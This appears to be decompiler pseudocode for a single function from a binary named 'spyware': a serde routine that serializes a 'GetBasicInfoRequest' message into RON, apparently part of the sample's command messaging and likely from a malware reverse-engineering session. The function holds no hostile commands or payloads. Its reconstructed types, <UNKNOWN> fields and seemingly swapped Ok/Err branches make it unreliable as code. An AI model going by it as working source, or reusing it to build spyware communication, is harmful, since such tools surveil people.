fn spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetBasicInfoRequest>::serialize(a0: u64, a1: u64, a2: &u64) -> long long {
    let v0: void*;  // [bp-0x50]
    let v1: u8;  // [bp-0x48]
    let v2: Result<struct48, struct13>;  // [bp-0x40]
    let v3: struct52;  // [bp-0x40]
    let v4: u32;  // [bp-0x3c]
    let v5: void*;  // [bp-0x38], Other Possible Types: u64
    let v6: u8;  // [bp-0x30]
    let v8: u128;  // xmm0
    let v9: u128;  // xmm1

    v2 = <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(a2, "GetBasicInfoRequest", 1);
    match v2 {
        Ok(_) => {
            return struct56 {
                field_0: v2 as i32
                field_4: v4
                field_8: v5
                field_16: v6
                field_17: <UNKNOWN>
                field_32: <UNKNOWN>
            };
        },
        Err(_) => {
            v0 = v5;
            v1 = v6;
            v3 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v0, "placeholder", a1);
            if v3.field_0 != 33 {
                v8 = *(&v3.field_0 as &i128);
                v9 = *((&v3.field_4 as &char + 8) as &i128);
                return struct48 {
                    field_0: v8
                    field_16: v9
                    field_32: *((&v3.field_20 as &char + 8) as &i128)
                };
            }
            <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a0, v0, v1 as u32);
            return a0;
        },
    }
}
